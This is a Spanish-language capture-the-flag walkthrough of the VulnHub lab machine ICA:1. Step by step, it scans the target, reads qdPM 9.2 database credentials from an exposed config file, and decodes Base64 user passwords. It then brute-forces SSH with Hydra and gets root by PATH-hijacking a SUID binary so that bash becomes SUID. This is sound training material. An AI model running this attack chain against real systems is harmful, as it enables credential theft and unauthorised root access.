
---

**1. Descargar la máquina de Vulhub:**

[ICA:1 Vulhub](https://www.vulnhub.com/entry/ica-1,748/)

---

**2. Localizamos la máquina con `arp-scan`:**

```bash
arp-scan --localnet
```

---

**3. Realizamos un ping a la máquina:**

```bash
ping <IP_victim>
```

---

**4. Reconocimiento con `nmap` y a sus puertos:**

```bash
nmap -p- -sCV --min-rate=5000 -vvv -n -Pn <IP_victim> -oG escaneo
```

```bash
nmap -p22,80,3306,33060 <IP_victim> -oN targeted
```

---

**5. Hicimos un `whatweb` para ver tecnologías:**

```bash
whatweb <IP_victim>
```

---

**6. Investigamos el sitio web:**

Al revisar la página web, encontramos que tiene **qdPM 9.2**. Investigamos vulnerabilidades asociadas con esta versión usando `searchsploit`:

```bash
searchsploit qdPM 9.2
```

Nos encontramos con una vulnerabilidad de **Password Exposure**. Procedemos a revisar el código con:

```bash
searchsploit -x php/webapps/50176.txt
```

Esto nos indica que la contraseña para conectarse a la base de datos está en un archivo `.yml`.

---

**7. Accedemos al archivo `databases.yml`:**

Copiamos la ruta del archivo y la añadimos al final de la URL:

```bash
http://<IP_victim>/core/config/databases.yml
```

Descargamos el archivo y al revisarlo con `cat`, encontramos un **usuario y contraseña**. Intentamos acceder por SSH y el login, pero no tuvimos éxito.

---

**8. Conexión a la base de datos:**

Probamos conectarnos a la base de datos con:

```bash
mysql -uqadpmadmin -h <IP_victim> -p
```

Tuvimos un error y lo solucionamos con el siguiente comando:

```bash
mysql -uqdpmadmin -h 192.168.100.126 -p --ssl=0
```

---

**9. Exploramos la base de datos:**

Una vez dentro de la base de datos:

```sql
show databases;
use staff;
select * from login;
select * from user;
```

Las contraseñas están en **Base64**, así que las decodificamos:

```bash
echo "c3VSSkFkR3dMcDhkeTNyRg==" | base64 -d; echo
```

Para descifrar todas las contraseñas de una vez:

```bash
for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee passwords
```

---

**10. Ataque de fuerza bruta a SSH con Hydra:**

Creamos un archivo llamado **user** con los usuarios encontrados y utilizamos **Hydra** para realizar un ataque de fuerza bruta al servicio SSH:

```bash
hydra -L users -P passwords ssh://<IP_victim>
```

Nos logeamos por SSH y ahora es momento de escalar privilegios.

---

**11. Escalación de privilegios:**

Buscamos binarios con permisos SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Vemos un binario SUID en el directorio `/opt/get_access`. Lo analizamos:

```bash
ls -l /opt/get_access
file /opt/get_access
```

Revisamos las **strings** para ver caracteres imprimibles y encontramos un archivo `cat/root/system.info`.

---

**12. Secuestro de binario y escalación de privilegios:**

Creamos nuestro propio binario `cat` en el directorio `/tmp/`:

```bash
touch /tmp/cat
chmod +x /tmp/cat
```

Modificamos nuestro **$PATH** para que apunte a `/tmp/`:

```bash
export PATH=/tmp:$PATH
```

Con este binario, cambiamos los permisos de **bash** a SUID:

```bash
chmod u+s /bin/bash
```

Ejecutamos el binario para obtener acceso root:

```bash
/opt/get_access
```

El mensaje dice: "All services are disabled. Accessing to the system is allowed only within working hours."

---

**13. Obtenemos acceso como root:**

Verificamos los permisos de **bash**:

```bash
ls -l /bin/bash
```

Ahora que **bash** tiene permisos SUID, ejecutamos:

```bash
bash -p
whoami
```

Y ¡somos root!

Para evitar problemas, quitamos `/tmp` de nuestro **$PATH** y obtenemos la bandera de root.

---

